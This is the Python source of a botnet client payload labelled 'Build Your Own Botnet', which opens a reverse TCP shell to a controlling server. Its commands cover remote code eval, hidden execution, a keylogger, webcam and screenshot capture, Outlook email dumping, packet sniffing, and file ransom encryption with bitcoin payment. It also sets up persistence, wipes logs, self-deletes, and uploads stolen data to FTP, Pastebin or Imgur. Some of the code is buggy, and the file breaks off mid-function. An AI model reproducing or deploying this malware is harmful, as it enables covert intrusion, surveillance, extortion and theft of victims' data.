#!/usr/bin/python
# -*- coding: utf-8 -*-
'Reverse TCP Shell (Build Your Own Botnet)'

# standard library
import os
import sys
import time
import json
import zlib
import uuid
import base64
import ctypes
import struct
import socket
import random
import urllib
import urllib2
import zipfile
import logging
import functools
import threading
import subprocess
import contextlib
import collections
import logging.handlers
try:
    from cStringIO import StringIO
except:
    from StringIO import StringIO

def config(*arg, **options):
    """ 
    Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
    """
    def _config(function):
        @functools.wraps(function)
        def wrapper(*args, **kwargs):
            return function(*args, **kwargs)
        for k,v in options.items():
            setattr(wrapper, k, v)
        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
        return wrapper
    return _config

def threaded(function):
    """ 
    Decorator for making a function threaded

    `Required`
    :param function:    function/method to add a loading animation
    """
    @functools.wraps(function)
    def _threaded(*args, **kwargs):
        t = threading.Thread(target=function, args=args, kwargs=kwargs, name=time.time())
        t.daemon = True
        t.start()
        return t
    return _threaded

# main
class Payload():
    """ 
    Reverse TCP shell designed to provide remote access
    to the host platform native terminal, enabling direct
    control of the device from a remote server.

    """

    def __init__(self, host='127.0.0.1', port=1337, **kwargs):
        """ 
        Create an instance of a reverse TCP shell 

        `Required`
        :param str host:          server IP address
        :param int port:          server port number

        """
        self.handlers   = {}
        self.flags      = self._get_flags()
        self.api        = self._get_api(pastebin=pastebin)
        self.remote     = {"modules": [], "files": []}
        self.connection = connect(host, port)
        self.key        = diffiehellman(self.connection)
        self.info       = self._get_info()

    def _get_flags(self):
        return collections.namedtuple('flag', ('connection','passive','prompt'))(threading.Event(), threading.Event(), threading.Event())

    def _get_command(self, cmd):
        if bool(hasattr(self, cmd) and hasattr(getattr(self, cmd), 'command') and getattr(getattr(self, cmd),'command')):
            return getattr(self, cmd)
        return False

    def _get_logger(self, host, port):
        logger  = logging.getLogger(self.info.get('uid'))
        logger.addHandler(logging.handlers.SocketHandler(host, port + 1))
        logger.setLevel(logging.DEBUG if '--debug' in sys.argv else logging.ERROR)
        return logger

    def _get_remote(self, base_url=None):
        if self.flags.connection.is_set():
            if not base_url:
                host, port = self.connection.getpeername()
                base_url   = 'http://{}:{}'.format(host, port + 1)
            self.resources = self._get_resources(target=self.remote['modules'], base_url='/'.join((base_url, 'modules')))

    def _get_info(self):
        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
            if function in globals() and callable(globals()[function]):
                info = {function: globals()[function]() }
                data = encrypt_aes(json.dumps(info), self.key)
                msg  = struct.pack('L', len(data)) + data
                while True:
                    sent = self.connection.send(msg)
                    if len(msg) - sent:
                        msg = msg[sent:]
                    else:
                        break
                header_size = struct.calcsize('L')
                header      = self.connection.recv(header_size)
                msg_len     = struct.unpack('L', header)[0]
                data        = self.connection.recv(msg_len)
                while len(data) < msg_len:
                    data += self.connection.recv(msg_len - len(msg))
                if isinstance(data, bytes) and len(data):
                    data = encrypt_aes(data, self.key)
                    try:
                        info = json.loads(data)
                    except: pass
                return collections.namedtuple('Session', info.keys())(*info.values())

    @threaded
    def _get_resources(self, target=None, base_url=None):
        if not isinstance(target, list):
            raise TypeError("keyword argument 'target' must be type '{}'".format(list))
        if not isinstance(base_url, str):
            raise TypeError("keyword argument 'base_url' must be type '{}'".format(str))
        if not base_url.startswith('http'):
            raise ValueError("keyword argument 'base_url' must start with http:// or https://")
        _debugger.info('[*] Searching %s' % base_url)
        path  = urllib2.urlparse.urlsplit(base_url).path
        base  = path.strip('/').replace('/','.')
        names = [line.rpartition('</a>')[0].rpartition('>')[2].strip('/') for line in urllib2.urlopen(base_url).read().splitlines() if 'href' in line if '</a>' in line if '__init__.py' not in line]
        for n in names:
            name, ext = os.path.splitext(n)
            if ext in ('.py','.pyc'):
                module = '.'.join((base, name)) if base else name
                if module not in target:
                    _debugger.info("[+] Adding %s" % module)
                    target.append(module)
            elif not len(ext):
                t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
                t.daemon = True
                t.start()
            else:
                resource = '/'.join((path, n))
                if resource not in target:
                    target.append(resource)

    @threaded
    def _get_prompt_handler(self):
        while True:
            try:
                self.flags.prompt.wait()
                self.send_task(session=self.info.get('uid'), task='prompt', result='[ %d @ {} ]> '.format(os.getcwd()))
                self.flags.prompt.clear()
                if globals()['_abort']:
                    break
            except Exception as e:
                debug(e)
                break

    @threaded
    def _get_thread_handler(self):
        while True:
            jobs = self.handlers.items()
            for task, worker in jobs:
                if not worker.is_alive():
                    dead = self.handlers.pop(task, None)
                    del dead
            if globals()['_abort']:
                break
            time.sleep(0.5)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """ 
        Change current working directory

        `Optional`
        :param str path:  target directory (default: current directory)

        """
        if os.path.isdir(path):
            return os.chdir(path)
        else:
            return os.chdir('.')


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """ 
        List the contents of a directory

        `Optional`
        :param str path:  target directory

        """
        output = []
        if os.path.isdir(path):
            for line in os.listdir(path):
                if len('\n'.join(output + [line])) < 2048:
                    output.append(line)
                else:
                    break
            return '\n'.join(output)
        else:
            return "Error: path not found"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """ 
        Display file contents

        `Required`
        :param str path:  target filename

        """
        output = []
        if not os.path.isfile(path):
            return "Error: file not found"
        for line in open(path, 'rb').readlines():
            line = line.rstrip()
            if len(line) and not line.isspace():
                if len('\n'.join(output + [line])) < 48000:
                    output.append(line)
                else:
                    break
        return '\n'.join(output)


    @config(platfoms=['win32','linux2','darwin'], command=False)
    def ftp(self, source, filetype=None, host=None, user=None, password=None):
        """ 
        Upload file/data to FTP server

        `Required`
        :param str source:    data or filename to upload

        `Optional`
        :param str filetype:  upload file type          (default: .txt)
        :param str host:      FTP server hostname       (default: self.api.ftp.host)
        :param str user:      FTP server login user     (default: self.api.ftp.user)
        :param str password:  FTP server login password (default: self.api.ftp.password)

        """
        try:
            for attr in ('host', 'user', 'password'):
                if not attr in locals():
                    if getattr(self.api.ftp, attr):
                        locals()[attr] = getattr(self.api.ftp, attr)
                    else:
                        raise Exception("missing credential '{}' is required for FTP uploads".format(attr))
            path  = ''
            local = time.ctime().split()
            if os.path.isfile(str(source)):
                path   = source
                source = open(str(path), 'rb')
            elif hasattr(source, 'seek'):
                source.seek(0)
            else:
                source = StringIO(bytes(source))
            host = ftplib.FTP(host=host, user=user, password=password)
            addr = urllib2.urlopen('http://api.ipify.org').read()
            if 'tmp' not in host.nlst():
                host.mkd('/tmp')
            if addr not in host.nlst('/tmp'):
                host.mkd('/tmp/{}'.format(addr))
            if path:
                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
            else:
                if filetype:
                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
                else:
                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
            stor = host.storbinary('STOR ' + path, source)
            return path
        except Exception as e:
            return "{} error: {}".format(self.ftp.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self, *args):
        """ 
        Show name of present working directory

        """
        return os.getcwd()


    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """ 
        Execute Python code in current context

        `Required`
        :param str code:        string of Python code to execute

        """
        try:
            return eval(code)
        except Exception as e:
            return "{} error: {}".format(self.eval.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """ 
        Download file from url as temporary file and return filepath

        `Required`
        :param str url:         target URL to download ('http://...')

        `Optional`
        :param str filename:    name of the file to save the file as

        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                debug("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self):
        """ 
        Shutdown the current connection and reset session

        """
        try:
            self.flags.connection.clear()
            self.flags.prompt.clear()
            self.connection.close()
            for thread in self.handlers:
                try:
                    self.stop(thread)
                except Exception as e:
                    debug("{} error: {}".format(self.kill.func_name, str(e)))
        except Exception as e:
            debug("{} error: {}".format(self.kill.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self, name=None):
        """ 
        Show usage help for commands and modules

        `Optional`
        :param str command:      name of a command or module

        """
        if not name:
            try:
                return help(self)
            except Exception as e:
                debug("{} error: {}".format(self.help.func_name, str(e)))
        elif hasattr(self, name):
            try:
                return help(getattr(self, name))
            except Exception as e:
                debug("{} error: {}".format(self.help.func_name, str(e)))
        else:
            return "'{}' is not a valid command and is not a valid module".format(name)


    @config(platforms=['win32','linux','darwin'], command=True, usage='mode <active/passive>')
    def mode(self, shell_mode):
        """ 
        Set mode of reverse TCP shell

        `Requires`
        :param str mode:     active, passive

        `Returns`
        :param str status:   shell mode status update

        """
        try:
            if str(arg) == 'passive':
                self.flags.passive.set()
                return "Mode: passive"
            elif str(arg) == 'active':
                self.flags.passive.clear()
                return "Mode: active"
            else:
                return "Mode: passive" if self.flags.passive.is_set() else "Mode: active"
        except Exception as e:
            debug(e)
        return self.mode.usage


    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """ 
        Abort tasks, close connection, and self-destruct leaving no trace on the disk

        """
        globals()['_abort'] = True
        try:
            if os.name is 'nt':
                clear_system_logs()
            if 'persistence' in globals():
                for method in persistence.methods:
                    if persistence.methods[method].get('established'):
                        try:
                            remove = getattr(persistence, 'remove_{}'.format(method))()
                        except Exception as e2:
                            debug("{} error: {}".format(method, str(e2)))
            if not _debug:
                delete(sys.argv[0])
        finally:
            shutdown = threading.Thread(target=self.get_shutdown)
            taskkill = threading.Thread(target=self.ps, args=('kill python',))
            shutdown.start()
            taskkill.start()
            sys.exit()
 

    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """ 
        Stop a running job

    `Required`
    :param str target:    name of job to stop
        """
        try:
            if target in self.handlers:
                _ = self.handlers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            debug("{} error: {}".format(self.stop.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """ 
        Show value of an attribute

    `Required`
    :param str attribute:    payload attribute to show

    Returns attribute(s) as a dictionary (JSON) object
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: status(_threads[a].name) for a in self.handlers if self.handlers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self.info)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            debug("'{}' error: {}".format(_threads.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """ 
        Unzip a compressed archive/file

        `Required`
        :param str path:    zip archive filename

        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                debug("{} error: {}".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def phone(self, args):
        """ 
        Use an online phone to send text messages

        `Required`
           :param str phone:     recipient phone number
           :param str message:   text message to send

        `Optional`
           :param str account:   Twilio account SID 
           :param str token:     Twilio auth token 
           :param str api:       Twilio api key

        """
        if 'phone' not in globals():
            phone = self.remote_import('phone')
        mode, _, args = str(args).partition(' ')
        if 'text' in mode:
            phone_number, _, message = args.partition(' ')
            return phone.text_message(phone_number, message)
        else:
            return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'


    @config(platforms=['win32','linux2','darwin'], command=False)
    def imgur(self, source):
        """ 
        Upload image file/data to Imgur

        `Required`
        :param str source:    data or filename

        """
        try:
            if getattr(self.api, 'imgur'):
                key = self.api.imgur
                api  = 'Client-ID {}'.format(key)
                if 'normalize' in globals():
                    source = normalize(source)
                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api}, data={'image': base64.b64encode(source), 'type': 'base64'})
                return str(json.loads(post)['data']['link'])
            else:
                return "No Imgur API Key found"
        except Exception as e2:
            return "{} error: {}".format(self.imgur.func_name, str(e2))

    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
    def upload(self, args):
        """ 
        Upload file to an FTP server, Imgur, or Pastebin

        `Required`
        :param str mode:      ftp, imgur, pastebin
        :param str source:    data or filename

        """
        try:
            mode, _, source = str(args).partition(' ')
            if not source:
                return self.upload.usage + ' -  mode: ftp, imgur, pastebin'
            elif mode not in ('ftp','imgur','pastebin'):
                return self.upload.usage + ' - mode: ftp, imgur, pastebin'
            else:
                return "{} error: invalid mode '{}'".format(self.upload.func_name, str(mode))
        except Exception as e:
            debug("{} error: {}".format(self.upload.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """ 
        Ransom personal files on the client host machine using encryption

          `Required`
        :param str mode:        encrypt, decrypt, payment
        :param str target:      target filename or directory path

        """
        if 'ransom' not in globals():
            ransom = self.remote_import('ransom')
        if not args:
            return self.ransom.usage
        cmd, _, action = str(args).partition(' ')
        if 'payment' in cmd:
            try:
                return ransom.payment(action)
            except:
                return "{} error: {}".format(shell._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
        elif 'decrypt' in cmd:
            return ransom.decrypt_threader(action)
        elif 'encrypt' in cmd:
            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
            return ransom.encrypt_threader(action)
        else:
            return self.ransom.usage


    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """ 
        View a live stream of the client host machine webcam or capture image/video

        `Required`
        :param str mode:      stream, image, video

        `Optional`
        :param str upload:    imgur (image mode), ftp (video mode)
        :param int port:      integer 1 - 65355 (stream mode)
        
        """
        try:
            if 'webcam' not in globals():
                webcam = self.remote_import('webcam')
            elif not args:
                result = self.webcam.usage
            else:
                args = str(args).split()
                if 'stream' in args:
                    if len(args) != 2:
                        result = "Error - stream mode requires argument: 'port'"
                    elif not str(args[1]).isdigit():
                        result = "Error - port must be integer between 1 - 65355"
                    else:
                        result = webcam.stream(port=args[1])
                else:
                    result = webcam.image(*args) if 'video' not in args else webcam.video(*args)
        except Exception as e:
            result = "{} error: {}".format(self.webcam.func_name, str(e))
        return result


    @config(platforms=['win32','linux2','darwin'], command=True, usage='restart [output]')
    def restart(self, output='connection'):
        """ 
        Restart the shell

        """
        try:
            debug("{} failed - restarting in 3 seconds...".format(output))
            self.kill()
            time.sleep(3)
            os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
        except Exception as e:
            debug("{} error: {}".format(self.restart.func_name, str(e)))


    @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
    def outlook(self, args=None):
        """ 
        Access Outlook email in the background without authentication

        `Required`
        :param str mode:    count, dump, search, results

        `Optional`
        :param int n:       target number of emails (upload mode only)

        """
        if 'outlook' not in globals():
            outlook = self.remote_import('outlook')
        elif not args:
            try:
                if not outlook.installed():
                    return "Error: Outlook not installed on this host"
                else:
                    return "Outlook is installed on this host"
            except: pass
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(outlook % mode):
                    if 'dump' in mode or 'upload' in mode:
                        self.handlers['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
                        self.handlers['outlook'].daemon = True
                        self.handlers['outlook'].start()
                        return "Dumping emails from Outlook inbox"
                    elif hasattr(outlook, mode):
                        return getattr(outlook, mode)()
                    else:
                        return "Error: invalid mode '%s'" % mode
                else:
                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
            except Exception as e:
                debug("{} error: {}".format(self.email.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
    def execute(self, args):
        """ 
        Run an executable program in a hidden process

        `Required`
        :param str path:    file path of the target program

        `Optional`
        :param str args:    arguments for the target program
        
        """
        path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
        args = [path] + args.split()
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    debug("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    @config(platforms=['win32'], buffer=StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
    def process(self, args=None):
        """ 
        Utility method for interacting with processes

        `Required`
        :param str mode:    block, list, monitor, kill, search

        `Optional`
        :param str args:    arguments specific to the mode
        
        """
        try:
            if 'process' not in globals():
                process = self.remote_import('process')
            elif not args:
                return self.ps.usage
            else:
                cmd, _, action = str(args).partition(' ')
                if hasattr(process, cmd):
                    return getattr(process, cmd)(action) if action else getattr(process, cmd)()
                else:
                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
        except Exception as e:
            debug("{} error: {}".format(self.process.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
    def portscan(self, args):
        """ 
        Scan a target host or network to identify 
        other target hosts and open ports.

        `Required`
        :param str mode:        host, network
        :param str target:      IPv4 address
        
        """
        if 'portscan' not in globals():
            portscan = self.remote_import('portscan')
        try:
            mode, _, target = str(args).partition(' ')
            if target:
                if not ipv4(target):
                    return "Error: invalid IP address '%s'" % target
            else:
                target = socket.gethostbyname(socket.gethostname())
            if hasattr(portscan, mode):
                return getattr(portscan, mode)(target)
            else:
                return "Error: invalid mode '%s'" % mode
        except Exception as e:
            debug("{} error: {}".format(self.portscan.func_name, str(e)))
            

    def pastebin(self, source, dev_key=None, user_key=None):
        """ 
        Dump file/data to Pastebin

        `Required`
        :param str source:      data or filename

        `Optional`
        :param str api_key:     Pastebin api_dev_key  (default: Payload.api.pastebin.api_key)
        :param str user_key:    Pastebin api_user_key (default: None)
        
        """
        try:
            if hasattr(self.api, 'pastebin'):
                info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': self.api.pastebin}
                paste = post('https://pastebin.com/api/api_post.php',data=info)
                parts = urllib2.urlparse.urlsplit(paste)       
                return urllib2.urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
            else:
                return "{} error: no pastebin API key".format(self.pastebin.func_name)
        except Exception as e:
            return '{} error: {}'.format(self.pastebin.func_name, str(e))


    @config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
    def keylogger(self, mode=None):
        """ 
        Log user keystrokes

        `Required`
        :param str mode:    run, stop, status, upload, auto
        
        """
        def status():
            try:
                mode    = 'stopped'
                if 'keylogger' in self.handlers:
                    mode= 'running'
                update  = status(float(self.handlers.get('keylogger').name))
                length  = keylogger._buffer.tell()
                return "Status\n\tname: {}\n\tmode: {}\n\ttime: {}\n\tsize: {} bytes".format(func_name, mode, update, length)
            except Exception as e:
                debug("{} error: {}".format('keylogger.status', str(e)))
        if 'keylogger' not in globals():
            keylogger = self.remote_import('keylogger')
        elif not mode:
            if 'keylogger' not in self.handlers:
                return keylogger.usage
            else:
                return status()      
        else:
            if 'run' in mode or 'start' in mode:
                if 'keylogger' not in self.handlers:
                    self.handlers['keylogger'] = keylogger.run()
                    return status()
                else:
                    return status()
            elif 'stop' in mode:
                try:
                    self.stop('keylogger')
                except: pass
                try:
                    self.stop('keylogger')
                except: pass
                return status()
            elif 'auto' in mode:
                self.handlers['keylogger'] = keylogger.auto()
                return status()
            elif 'upload' in mode:
                result = pastebin(keylogger._buffer) if not 'ftp' in mode else ftp(keylogger._buffer)
                keylogger.buffer.reset()
                return result
            elif 'status' in mode:
                return status()        
            else:
                return keylogger.usage + '\n\targs: start, stop, dump'


    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
    def screenshot(mode=None):
        """ 
        Capture a screenshot from host device

        `Optional`
        :param str mode:   ftp, imgur (default: None)
        
        """
        try:
            if 'screenshot' not in globals():
                screenshot = self.remote_import('screenshot')
            elif not mode in ('ftp','imgur'):
                return "Error: invalid mode '%s'" % str(mode)
            else:
                return screenshot.screenshot(mode)
        except Exception as e:
            debug("{} error: {}".format(self.screenshot.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
    def persistence(self, args):
        """ 
        Establish persistence on client host machine


        `Required`
        :param str target:    run, abort, methods, results

        `Methods`
        :method all:                All Methods
        :method registry_key:       Windows Registry Key
        :method scheduled_task:     Windows Task Scheduler
        ;method startup_file:       Windows Startup File
        :method launch_agent:       Mac OS X Launch Agent
        :method crontab_job:        Linux Crontab Job
        :method hidden_file:        Hidden File
        
        """
        try:
            if not 'persistence' in globals():
                persistence = self.remote_import('persistence')
            else:
                cmd, _, action = str(args).partition(' ')
                if cmd not in ('add','remove'):
                    return self.persistence.usage + str('\nmethods: %s' % ', '.join(persistence.methods()))
                for method in methods:
                    if method == 'all' or action == method:
                        persistence.methods[method].established, persistence.methods[method].result = persistence.methods[method].add()
                return json.dumps(persistence.results())
        except Exception as e:
            debug("{} error: {}".format(self.persistence.func_name, str(e)))
        return str(self.persistence.usage + '\nmethods: %s' % ', '.join([m for m in persistence.methods if sys.platform in getattr(shell, '_persistence_add_%s' % m).platforms]))


    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer mode=[str] time=[int]')
    def packetsniffer(self, args):
        """ 
        Capture traffic on local network

        `Required`
        :param str mode:        ftp, pastebin
        :param int seconds:     duration in seconds
        
        """
        try:
            if 'packetsniffer' not in globals():
                packetsniffer = self.remote_import('packetsniffer')
            mode = None
            length = None
            cmd, _, action = str(args).partition(' ')
            for arg in action.split():
                if arg.isdigit():
                    length = int(arg)
                elif arg in ('ftp','pastebin'):
                    mode = arg
            self.handlers['packetsniffer'] = packetsniffer(mode, seconds=length)
            return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))


    def remote_import(self, modules):
        """ 
        Remotely import a module/package remotely from a server
        directly into the currently running process without it
        touching the disk

        `Required`
        :param list/str modules:   list of target module names
        
        """
        host, port = self.connection.getpeername()
        if isinstance(modules, str):
            modules = modules.split(',')
        if isinstance(modules, list):
            for module in modules:
                if module in self._modules:
                    with remote_repo(self.remote['modules'], 'http://{}:{}/modules'.format(host, port + 1)):
                        try:
                            exec "import %s" % module in self.modules
                            sys.modules[module] = globals()[module]
                        except ImportError as e:
                            debug(e)
                elif module in self._packages:
                    with remote_repo(self.remote['packages'], 'http://{}:{}/packages'.format(host, port + 1)):
                        try:
                            exec "import %s" % module in globals()
                            sys.modules[module] = globals()[module]
                        except ImportError as e:
                            debug(e)
                elif module in self.remote['files']:
                    try:
                        self.resources[module] = urllib2.urlopen('http://{}:{}/resources/{}'.format(host, port, module)).read()
                        return self.resources[module]
                    except Exception as e:
                        debug(e)
                else:
                    try:
                         return urllib2.urlopen('http://{}:{}/{}'.format(host, port, module)).read()
                    except Exception as e:
                        debug(e)
        else:
            raise TypeError('argument `modules` must be a list or string of module names separated by commas')

    def diffiehellman(connection):
        """ 
        Diffie-Hellman Internet Key Exchange (RFC 2741)

        `Requires`
        :param socket connection:     socket.socket object

        Returns the 256-bit binary digest of the SHA256 hash
        of the shared session encryption key

        """
        if isinstance(connection, socket.socket):
            g  = 2
            p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
            xA = pow(g, a, p)
            connection.send(Crypto.Util.number.long_to_bytes(xA))
            xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
            x  = pow(xB, a, p)
            return Crypto.Hash.SHA256.new(Crypto.Util.number.long_to_bytes(x)).digest()
        else:
            raise TypeError("argument 'connection' must be type '{}'".format(socket.socket))

    def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
        """ 
        XOR-128 encryption

        `Required`
        :param str data:        plaintext
        :param str key:         256-bit key

        `Optional`
        :param int block_size:  block size
        :param int key_size:    key size
        :param int num_rounds:  number of rounds
        :param str padding:     padding character

        Returns encrypted ciphertext as base64-encoded string

        """
        data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = os.urandom(8)
        result  = [vector]
        for block in blocks:
            block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
            v0, v1  = struct.unpack("!2L", block)
            k       = struct.unpack("!4L", key[:key_size])
            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
            for round in range(num_rounds):
                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
                sum = (sum + delta) & mask
                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
            output  = vector = struct.pack("!2L", v0, v1)
            result.append(output)
        return base64.b64encode(bytes().join(result))

    def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding=chr(0)):
        """ 
        XOR-128 encryption

        `Required`
        :param str data:        ciphertext
        :param str key:         256-bit key

        `Optional`
        :param int block_size:  block size
        :param int key_size:    key size
        :param int num_rounds:  number of rounds
        :param str padding:     padding character

        Returns decrypted plaintext as string

        """
        data    = base64.b64decode(data)
        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
        vector  = blocks[0]
        result  = []
        for block in blocks[1:]:
            v0, v1 = struct.unpack("!2L", block)
            k = struct.unpack("!4L", key[:key_size])
            delta, mask = 0x9e3779b9L, 0xffffffffL
            sum = (delta * num_rounds) & mask
            for round in range(num_rounds):
                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
                sum = (sum - delta) & mask
                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
            decode = struct.pack("!2L", v0, v1)
            output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
            vector = block
            result.append(output)
        return str().join(result).rstrip(padding)


    def connect(self, host, port):
        """ 
        Create a streaming socket object and
        make a TCP connection to the server
        at the given address (host, port)

        `Required`
        :param str host:    IPv4 address
        :param int port:    port number

        Returns a connected `socket.socket` object

        """
        if not ipv4(host):
            raise ValueError('invalid IPv4 address')
        elif not (1 < int(port) < 65355):
            raise ValueError('invalid port number')
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            sock.setblocking(True)
            return sock

    def send_task(self, task):
        """ 
        Send task results to the server

        `Requires`
        :param dict task:
          :attr str uid:             task ID assigned by server
          :attr str task:            task assigned by server
          :attr str result:          task result completed by client
          :attr str session:         session ID assigned by server
          :attr datetime issued:     time task was issued by server
          :attr datetime completed:  time task was completed by client

        Returns True if succesfully sent task to server, otherwise False

        """
        if not isinstance(task, dict):
            raise TypeError('task must be a dictionary object')
        if not 'uid' in task or not 'task' in task or not 'result' in task:
            raise ValueError('task missing field(s): uid, result, task')
        if not 'session' in task:
            task['session'] = self.info.get('uid')
        if self.flags.passive.is_set():
            task  = logging.makeLogRecord(task)
            self._logger.info(task)
            return True
        else:
